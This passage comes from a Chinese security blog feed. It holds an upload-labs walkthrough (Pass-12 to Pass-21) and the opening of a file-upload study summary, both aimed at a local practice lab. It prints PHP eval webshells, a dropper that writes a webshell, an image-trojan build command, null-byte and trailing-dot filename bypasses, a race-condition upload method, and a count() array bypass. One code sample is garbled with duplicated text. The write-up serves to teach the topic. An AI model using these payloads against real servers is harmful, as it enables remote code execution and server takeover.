src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022001004.png"></p><p>上传成功</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022001327.png"></p><p>访问成功</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022001699.png"></p><h2 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h2><p>看源码</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022001697.png"></p><p>save_path是一个可控的变量，后面还有一个后缀名需要绕过，这个时候需要使用%00截断，不过这个东西已经是旧时代的产物的，所以有使用条件</p><p>1、php版本小于5.3.4</p><p>2、php的magic_quotes_gpc为OFF状态</p><p>这里的官方环境满足上两点，不需要我们去操作。</p><p>【00截断原理】</p><p>    谈到00截断我们都会想到，有什么0x00截断、%00截断，也有人对两个东西分析一大堆，那么它俩有什么区别呢，什么场合适用哪一个呢？这就要从00截断的原理说起：</p><p>其实截断的原理也很简单，无论0x00还是%00，最终被解析后都是一个东西:chr（0）。</p><p>char(0)是什么东西？</p><p>    chr()是一个函数，这个函数是用来返回参数所对应的字符的，也就是说，参数是一个ASCII码，返回的值是一个字符，类型为string。</p><p>那么chr(0)就很好理解了，对照ASCII码表可以知道，ASCII码为0-127的数字，每个数字对应一个字符，而0对应的就是NUT字符（NULL），也就是空字符</p><p>而截断的关键就是这个空字符，<strong>当一个字符串中存在空字符的时候，在被解析的时候会导致空字符后面的字符被丢弃。</strong></p><p>参考文献：</p><p><a href="https://blog.csdn.net/weixin_44840696/article/details/90581104" title="文件上传绕过之00截断_00截断绕过-CSDN博客">文件上传绕过之00截断_00截断绕过-CSDN博客</a></p><p>解释完后，我们就要开始想办法怎么利用这个00截断来进行绕过，我们可以看到img_path是通过get传参传递的，那么我们不妨在这块将路径改掉，改为upload&#x2F;web.php%00。那么后面不管是什么东西都会被截断掉，然后经过move_uploaded_file函数将临时文件重新复制给我们的截断之前的文件路径。</p><p>当然，我们还是要上传我们地jpg文件的，使得我们可以进行下面程序的运行。</p><p>所以我们这里还是上传我们之前做的1.jpg。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022001561.png"></p><p>抓包修改</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">upload/webshell.php%<span class="hljs-number">00</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022001190.png"></p><p>注意访问的是我们上面写的webshell.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//localhost/upload-labs/upload/webshell.php</span><br></code></pre></td></tr></table></figure><p>成功</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022001497.png"></p><h2 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h2><p>查看源代码，和第十一关对比，发现接受值变成了post，那么思路就和第十一关一样，不过post方式不会自行编码，所以得换一种方式。</p><p>在这一关我们就需要现在web.php后面加一个占位符（随便写个字符，能找到就行），然后将占位符得16进制改为00，这样空字节00就出现了，最后在移动文件的时候就会触发\00截断。</p><p>还是上传1.jpg。</p><p>写占位符（作者这里随便写了个0）</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022001259.png"></p><p>换成16进制</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022001457.png"></p><p>找到我们写的0（可以先照着右边找）</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022002820.png"></p><p>改成00</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022002452.png"></p><p>访问webshell.php，成功</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022002919.png"></p><h2 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h2><p>安排任务了</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022002584.png"></p><p>查看提示，说检查图片内容开头两个字节。</p><p>PEG&#x2F;IFIF（常见的照片格式)：头两个字节为·0 xFF·0xD8。</p><p>PNG（无损压缩格式)：头两个字节为·0x89·0x50。</p><p>GIF（支持动画的图像格式)：头两个字节为·0x47·0x49。</p><p>BMP(Windows位图格式)：头两个字节为·0x42·0x4D。</p><p>TFF(标签图像文件格式)：头两个字节可以是不同的数值</p><p>这里只用jpg图片做示范。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022002283.png"></p><p>这里可以使用cmd命令。</p><p>在同时有图片和一句话木马的文件夹下打开cmd，然后使用以下命令。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">copy 图片名 /b + 一句话木马的文件名 /a webshell.jpg<br></code></pre></td></tr></table></figure><p>意思是将一句话木马文件中的代码追加到图片中并重新生成一个叫webshell.php的代码。</p><p>比如作者图片名就叫“重庆森林不在重庆.jpg”，一句话木马的文件名还是“webshell.php”。</p><p>那么作者的命令为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">copy 重庆森林不在重庆.jpg /b + webshell.php /a webshell.jpg<br></code></pre></td></tr></table></figure><p>下图表示图片马制作成功。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022002393.png"></p><p>上传成功，是作者的头像</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022002813.png"></p><p>那我们怎么执行恶意代码呢？</p><p>直接访问显然是不行的，只会出现图片本身，要注意任务本身已经给出提示，要利用文件包含漏洞。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022002472.png"></p><p>我们使用靶机给我们的文件包含漏洞进行解析，这个文件包含的特性是会将我们所有包含进来的文件都以php进行解析</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022002464.png"></p><p>请求时地址要加上file，注意图片名可能会被改。</p><p>以作者的为例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//localhost/upload-labs/include.php?file=upload/4220241025001424.jpg</span><br></code></pre></td></tr></table></figure><p>注意有的图片访问时报错，说是php语法错误之类的，可能是以php运行图片导致的问题。</p><p>如果大家的图片确实没有好使的，可以用Windows自带的‘画图’做一张纯白色图片（不用做任何修改），然后保存。或者换种类型的图片也行。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022002197.png"></p><p>png图片马过程和上面一样，这里就不多做赘述了。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022002227.png"></p><p>GIF也一样</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022002946.png"></p><h2 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h2><p>查看源码，关键函数是这个getimagesize</p><p>getimagesize函数会对目标的十六进制的前几个字符串进行读取。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022002169.png"></p><p>和上一关同理，按道理直接上传上一关的图马就行</p><p>但是作者这里居然上传不了图片（找了几张正常图片也没上传成功）。</p><p>大家可以在评论区讨论一下原因</p><h2 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h2><p>知识补充： exif_imagetype()读取一个图像的第一个字节并检查其后缀名。</p><p>返回值与getimage()函数返回的索引2相同，但是速度比getimage快得多。需要开启php_exif模块。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022002826.png"></p><p>如果按作者上面文章配置的环境，默认已经开启，不需要手动开启。如果不是，接下来开启php_exif模块</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022002899.png"></p><p>所以还是可以用之前的图片马绕过，并使用文件包含漏洞解析图片马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//localhost/upload-labs/include.php?file=upload/3620241025170953.jpg</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022002544.png"></p><p>其他格式也一样，不在这里演示了</p><h2 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h2><p>查看提示发现有重新渲染，查看源码。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022002896.png"></p><p>imagecreatefromjpeg（）等函数会使用上传的图片生成新的图片，即二次渲染（二次渲染‌是指上传的文件（如图片）在显示之前会进行二次处理，包括解码、转换等操作，这可能会导致其中的恶意代码失效。）。</p><p>所以二次渲染会创建一个新图象，成功则返回图像标识符&#x2F;图像资源，失败则返回false，从而会导致图片马的数据丢失，上传的图片马无法执行。</p><p>二次渲染是后端重写文件内容，常见会用到的函数有：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">basename</span>(path[,suffix])没指定suffix则返回后缀名，有则不返回指定的后缀名<br> <br><span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-keyword">string</span>,char)函数查找字符串在另一个字符串中最后一次出现的位置，并返回从该位置到字符串结尾的所有字符。<br> <br><span class="hljs-title function_ invoke__">imagecreatefromgif</span>()：创建一块画布，并从 GIF 文件或 URL 地址载入一副图像<br> <br><span class="hljs-title function_ invoke__">imagecreatefromjpeg</span>()：创建一块画布，并从 JPEG 文件或 URL 地址载入一副图像<br> <br><span class="hljs-title function_ invoke__">imagecreatefrompng</span>()：创建一块画布，并从 PNG 文件或 URL 地址载入一副图像<br></code></pre></td></tr></table></figure><p>按照前几关的方式上传，可以上传，但是包含漏洞无法解析。原因就是二次渲染将图片马里面的php代码打乱了。</p><p>对于做文件上传之二次渲染建议用GIF图片，制作会更简单一点。</p><p>对GIF，我们需要把原图和修改后的图片进行比较，看哪里没有被打散：</p><p>上传正常的GIF图片，然后下载回显的图片，用010Editor编辑器进行对比两个GIF图片内容，找到相同的地方（指的是上传前和上传后，两张图片的部分Hex仍然保持不变的位置）</p><p>上传前：</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022002835.png"></p><p>上传后：</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022002488.png"></p><p>在蓝色框里插入PHP一句话，上传后，仍未被打散</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022002095.png"></p><p>如果肉眼对比不方便的话，似乎也可以复制两个文件的二进制形式，然后在burpsuite的Comparer中对比；也可以用beyond compare这一工具查看两张图，直接去对比打散情况。</p><p>制作好后，访问图片</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//localhost/upload-labs/include.php?file=upload/26259.gif</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022003714.png"></p><p>至于png以及jpg，就相对而言没有这么简单，大家要是有兴趣可以参考这篇文章：</p><p><a href="https://xz.aliyun.com/t/2657?time__1311=n4+xnieDw4uneG=D/WT4BIpxGTeWq5KqhD&alichlgref=https://xz.aliyun.com/t/5791?time__1311=n4%252BxnD07DtKxcDIx7qGNWpDUhAFuwY6Nx#toc-6" title="文章 - upload-labs之pass 16详细分析 - 先知社区">文章 - upload-labs之pass 16详细分析 - 先知社区</a></p><h2 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h2><p>提示说要代码审计</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022003473.png"></p><p>分析代码，可以看到他的逻辑是先对文件进行了上传操作，然后在判断文件的扩展名在不在白名单中，如若在，进行重命名；不在，则对其进行删除。</p><p>也就是说如果我们上传php文件，它会先上传，然后判断不符合，再删除我们的木马。</p><p>这么看来如果我们还是上传一个图片马的话，网站依旧存在文件包含漏洞我们还是可以进行利用。</p><p>直接就出了，</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022003384.png"></p><p>但假设这一题没有文件包含漏洞的话，那我们怎么办？</p><p>尽管我们创上传的web.php这一文件不可避免的要删掉，但它终归是上传了。只要它上传了，我们就可以想方设法利用它。</p><p>我们可以想方法在web.php被删除之前执行它，从而通过web.php去生成一个webshell.php。</p><p>如何做呢？</p><p>先制作一个web.php，写上如下内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&#x27;../upload/webshell.php&#x27;</span>, <span class="hljs-string">&#x27;&lt;?php @eval($_POST[&quot;1&quot;]); ?&gt;&#x27;</span>); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这段代码的作用：</p><p>一旦访问到我们写的web.php，就会在upload目录下生成一个webshell.php，并写入<code>&lt;?php @eval($_POST[&quot;1&quot;]); ?&gt;</code>，这样生成的webshell.php是不会被程序删除掉的。</p><p>要注意web.php和webshell.php是不一样的，web.php是我们制作的的，而webshell.php是访问并执行web.php后生成的。</p><p>所以如果我们能在上传的web.php被删除之前访问，那么就会生成新的一句话木马webshell.php，要知道代码在执行的时候也是需要时间的，尽管这个时间特别短，只要我们能利用住，也会成功的。这个就叫做条件竞争上传绕过。</p><p>我们可以利用burpsuite，把web.php文件通过burp一直不停的重放上传，然后我们再开一个线程去一直访问我们的web.php文件，总会有那么一瞬间是还没来得及删除就可以被访问到的，那我们就成功了。</p><p>下面是具体步骤：</p><p>首先，先上传我们的web.php文件，用burp进行拦截，然后放到重放模块下，进行多次上传</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022003641.png"></p><p>一开始会自动选出payload，但是我们不需要，我们只要不断上传即可，所以点击Clear去掉payload</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022003931.png"></p><p>然后将payload类型设为空，意思是上传空的payload</p><p>重发请求数值大一些，这里作者设置为6000，不够的话可以选择下面的Continue indefinitely去一直请求</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022003386.png"></p><p>再抓取一个我们访问上传的web.php文件的，也放到bp的重发包上面</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022003426.png"></p><p>和之前一样，这里作者把重发数值设置为12000</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022003565.png"></p><p>这样就一边上传，一边请求了，只要有一次访问得到，那么就会在upload文件夹里创建webshell.php。</p><p>经过条件竞争，是有机会访问到的。</p><p>我们直接用蚁剑连接</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022003140.png"></p><h2 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h2><p>从源码来看的话，服务器先是将文件后缀跟白名单做了对比，然后检查了文件大小以及文件是否已经存在。</p><p>这么看来的话，php是不能上传了，只能上传图片马了，而且需要在图片马没有被重命名之前访问它。</p><p>要让图片马能够执行还要配合其他漏洞，比如文件包含。</p><p>这道题直接利用文件包含和图片马也可以成功。但题目让我们多绕了一步，为了训练，这里还是用条件竞争。</p><p>（作者试过文件包含和图片马可行）</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022003575.png"></p><p>但我们还是按照题目走吧。</p><p>注意这次上传图片的位置变了。我们随便上传一张图片，右击复制其地址：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//localhost/upload-labs/upload1729991308.jpg</span><br></code></pre></td></tr></table></figure><p>发现图片直接上传在upload-labs文件夹下，和之前不一样。</p><p>这里我们修改一下上传地址，改成之前的upload文件夹下</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022003907.png"></p><p>还是制作图片马：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">copy 无标题.jpg /b + RaceCondition.php /a RaceCondition.jpg<br></code></pre></td></tr></table></figure><p>无标题.jpg是作者随便做了一张图片，RaceCondition.php是一句话木马文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&#x27;../upload-labs/upload/webshell.php&#x27;</span>, <span class="hljs-string">&#x27;&lt;?php @eval($_POST[&quot;1&quot;]); ?&gt;&#x27;</span>); <span class="hljs-meta">?&gt;</span>xxxxxxxxxx <span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&#x27;../upload-labs/upload/webshell.php&#x27;</span>, <span class="hljs-string">&#x27;&lt;?php @eval($_POST[&quot;1&quot;]); ?&gt;&#x27;</span>); <span class="hljs-meta">?&gt;</span><span class="hljs-string">&#x27;); ?&gt;</span><br></code></pre></td></tr></table></figure><p>剩下步骤和上一题一样。</p><p>先抓包上传请求</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022003277.png"></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022003226.png"></p><p>再抓包访问请求（别忘了利用文件包含）</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022005710.png"></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022003012.png"></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022003286.png"></p><p>成功</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022003783.png"></p><h2 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass-20"></a>Pass-20</h2><p>看提示</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022004939.png"></p><p>看源码，发现没有对上传的文件做判断，只对用户输入的文件名做判断</p><p>说白了，它只检查我们输入的那个文件名，不检查文件原来的名字</p><p>由于move_uploaded_file()有这么一个特性，会忽略掉文件末尾的 &#x2F;.</p><p>所以我们后面加个点就可以绕过黑名单，上传webshell.php，输入名字为webshell.php.</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022004917.png"></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022004666.png"></p><p>访问成功</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//localhost/upload-labs/upload/webshell.php</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022004914.png"></p><h2 id="Pass-21"><a href="#Pass-21" class="headerlink" title="Pass-21"></a>Pass-21</h2><p>我们不仅可以上传文件，还可以决定保存名称。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022004610.png"></p><p>这一关是数组绕过，利用了count()函数漏洞。</p><p>count()函数漏洞原理：</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022004897.png"></p><p>我们这里举个例子，</p><p>现自定义一个数组 arr[]，定义arr[0]&#x3D;0，arr[3]&#x3D;3,</p><p>此时arr这一数组共有两个元素，count(arr)的值为2，则arr[count(arr)]即为arr[2]，但是arr[2]未定义，即为一个空值，</p><p>若使用count()函数本来是想指向arr数组的最后一个元素，此时却指向arr[2]，形成数组漏洞。</p><p>那我们再来看这道题。</p><p>先给出一些函数解释，以免大家审计代码的时候读不懂：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">explode</span>(a,b)函数以a为分割，把b转为数组。<br> <br><span class="hljs-title function_ invoke__">reset</span>()函数把数组内部指针移动到数组第一个元素，并返回值。<br> <br><span class="hljs-title function_ invoke__">end</span>() 把数组内部指针移动到数组最后一个元素，并返回值。<br></code></pre></td></tr></table></figure><p>count()函数数组元素的数量。</p><p>然后我们看下面这段代码可以知道最终的文件名是由数组的第一个和最后一个元素拼接而成。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022004429.png"></p><p>正常情况来说，我们是没办法绕过的，但是这里有个判断：如果不是数组，就自己拆成数组。</p><p>隐藏含义就是说，我们也可以自己传数组进入。这就给了我们利用count()函数漏洞的机会。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022004604.png"></p><p>下面我们对源代码进行整体的分析：</p><p>——&gt; 验证上传路径是否存在</p><p>——&gt; 验证[‘upload_file’]的content-type是否合法（MIME检查，见第二关）</p><p>——&gt; 判断POST参数save_name（即我们自己输入的文件名）是否为空。如果为空，$file就等于上传文件原本的名字；不为空，$file就等于我们输入的那个文件名（即$file &#x3D; save_name）。</p><p>——&gt;判断file是不是数组，不是的话则使用explode(‘.’, strtolower($file))对file进行切割，将file变为一个数组</p><p>——&gt; 用end()函数取后缀进行白名单检查，只有jpg、png、gif才可以通过</p><p>——&gt; 数组第一位和$file[count($file) - 1]进行拼接，产生保存文件名file_name</p><p>——&gt; 上传文件</p><p>可知，其中有两次检查和一次改名</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022004209.png"></p><p>然后我们针对源代码进行绕过，提交一句话木马webshell.php，保存名称也写webshell.php</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022004182.png"></p><p>抓包，开始操作</p><p>修改content-type为image&#x2F;jpeg（绕过MIME检查）</p><p>修改POST参数（save_name）为数组类型：</p><p>索引[0]为我们输入的名字‘webshell.php‘，</p><p>索引[2]我们自己添加一条数据，为‘jpg’。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022004504.png"></p><p>Forward放包</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022004219.png"></p><p>访问一下，成功</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022004160.png"></p><p>我们这里复盘一下，我们先是修改content-type绕过MIME检查。</p><p>然后修改POST参数（save_name）为数组类型，save_name[0]为 ‘webshell.php‘，save_name[2]为’jpg’。</p><p>这样的话<code>$ext = end($file) = $file[2] = save_name[2] = jpg</code>通过白名单，而且<code>$file_name = reset($file) . &#39;.&#39; . $file[count($file) - 1] = reset($file) . &#39;.&#39; . $file[2-1] = $file[0] . &#39;.&#39; . $file[1]</code>，又<code>$file[1]</code>值为空，所以<code>$file_name = $file[0] . &#39;.&#39; . = save_name[0] . &#39;.&#39; . = webshell.php.</code>，然后webshell.php.最后的点会自动去掉，文件名最终为webshell.php，和我们输入的一样，解决了文件改名的问题。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://blog.csdn.net/m0_64620936/article/details/136591580" title="Upload-labs 1-20关靶场通关攻略(全网最全最完整)_upload靶场-CSDN博客">Upload-labs 1-20关靶场通关攻略(全网最全最完整)_upload靶场-CSDN博客</a></p><p><a href="https://blog.csdn.net/qq_53003652/article/details/129969951" title="upload-labs详解1-19关通关全解（最全最详细一看就会）-CSDN博客">upload-labs详解1-19关通关全解（最全最详细一看就会）-CSDN博客</a></p><p><a href="https://blog.csdn.net/m0_74013288/article/details/134104006" title="文件上传漏洞靶场（upload-labs）通关-CSDN博客">文件上传漏洞靶场（upload-labs）通关-CSDN博客</a></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件上传学习总结</title>
    <link href="/2025/05/04/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/"/>
    <url>/2025/05/04/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>本文是作者由CSDN博客迁移而来，原文地址：<a href="https://blog.csdn.net/2302_81178149/article/details/145433812">https://blog.csdn.net/2302_81178149/article/details/145433812</a></p></blockquote><p>我们下面进行下一个漏洞——文件上传的学习。文件上传是常见漏洞之一，是Web安全必学漏洞。</p><p>为探讨清楚文件上传漏洞的诸多细节，<strong>我们特选经典的upload-labs进行从入门到进阶的专项训练</strong>。本文是经由upload-labs训练总结而来，<strong>所以配合作者的upload-labs通关全详解食用更佳（怎么可以光学习不训练呢）</strong>。</p><p> upload-labs通关：<a href="https://blog.csdn.net/2302_81178149/article/details/145442006" title="upload-labs通关全详解-CSDN博客">upload-labs通关全详解-CSDN博客</a></p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>这里大家最好还要有一些php基础，能大概读懂代码就可以；至于html之类的，大家经过之前的学习已经满足要求了。</p><ul><li>PHP 文件的默认扩展名是 “.php”  </li><li>PHP 文件中可以包含 html、css、JavaScript 代码</li></ul><table><thead><tr><th>序号</th><th>组成</th><th>描述</th></tr></thead><tbody><tr><td>1</td><td><code>&lt;?php ... ?&gt;</code></td><td>PHP 标记</td></tr><tr><td>2</td><td>PHP代码</td><td>函数、数组、流程控制、类、方法…</td></tr><tr><td>3</td><td><code>;</code>、<code>()</code></td><td>语句结束符</td></tr><tr><td>4</td><td>空白符</td><td>合理使用空白符可增强代码可读性</td></tr><tr><td>5</td><td>注释</td><td><code>// 单行注释</code>，<code>/* 多行注释 */</code></td></tr></tbody></table><h2 id="文件上传基础"><a href="#文件上传基础" class="headerlink" title="文件上传基础"></a>文件上传基础</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>文件上传是web系统中常见的一种功能，通过文件上传能实现上传图片、视频，以及其他类型的文件。</p><p>文件上传漏洞是指用户利用文件上传功能上传了一个可以执行的脚本文件，并且可以通过该文件获得服务器的权限的一种漏洞。</p><p>说白了，文件上传漏洞就是用户通过上传恶意文件去入侵服务器的一种漏洞。这个恶意文件被称为webshell，也可以称为一种网页后门。</p><h3 id="关于webshell"><a href="#关于webshell" class="headerlink" title="关于webshell"></a>关于webshell</h3><ul><li>拥有较完整功能的webshell，我们一般称为大马。</li><li>功能简易的webshell称为小马。</li><li>除此之外还存在一句话木马、菜刀马、脱库马等等的名词，是对于webShell功能或者特性的简称。</li></ul><h3 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h3><p>在upload-labs中我们主要用了一句话木马，故这里对一句话木马进行简单解析。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>&lt;?php ……?&gt;</code>是PHP标记，是PHP标记，代表着这是一句PHP代码</p><p>eval()在PHP手册里的解释：</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021911990.png"></p><p><code>$_POST[]</code>其实是一种全局变量</p><table><thead><tr><th>变量</th><th>描述</th></tr></thead><tbody><tr><td><code>$_GET</code></td><td>收集来自 <code>method=&quot;get&quot;</code> 的表单中的值</td></tr><tr><td><code>$_POST</code></td><td>收集来自 <code>method=&quot;post&quot;</code> 的表单中的值</td></tr><tr><td><code>$_REQUEST</code></td><td>包含 <code>$_POST</code>、<code>$_GET</code> 和 <code>$_COOKIE</code></td></tr><tr><td><code>$GLOBALS</code></td><td>全部变量的全局组合数组</td></tr><tr><td><code>$_COOKIE</code></td><td>常用于识别用户</td></tr><tr><td><code>$_SESSION</code></td><td>存储关于用户会话（session）的信息</td></tr><tr><td><code>$_FILES</code></td><td>用来获取通过 POST 方法上传文件的相关信息</td></tr><tr><td><code>$_SERVER</code></td><td>服务器和执行环境信息</td></tr><tr><td><code>$_ENV</code></td><td>环境变量</td></tr></tbody></table><p>这样我们就可以综合起来看这一句话木马的含义，其实就是一句PHP代码，收集所有用POST方法传递的key的值（这个‘key’是我们任意起的名字），并将其执行</p><p>比如我们用POST方法传递一个key&#x3D;phpinfo();</p><p>此时一句话木马就是<code>&lt;?php 